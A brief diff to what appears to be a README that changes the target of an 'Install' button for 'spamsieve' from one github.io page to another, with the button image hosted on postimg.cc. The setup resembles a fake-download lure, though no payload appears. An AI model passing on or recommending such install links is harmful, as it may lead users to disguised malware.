@@ -6,7 +6,7 @@
 
 <p align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://software-link-apps.github.io/.github/spamsieve)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://clean-clouds.github.io/.github/spamsieve)
 
 </p>
 
